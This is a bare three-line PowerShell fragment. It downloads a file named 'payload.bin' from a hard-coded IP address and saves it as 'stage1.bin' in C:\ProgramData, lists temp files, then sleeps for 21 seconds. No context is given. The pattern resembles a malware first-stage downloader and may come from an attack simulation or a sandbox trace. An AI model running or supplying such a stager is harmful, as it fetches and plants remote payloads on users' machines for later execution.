(New-Object System.Net.WebClient).DownloadFile('http://198.51.100.135/payload.bin', "C:\ProgramData\stage1.bin")
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Start-Sleep -Seconds 21
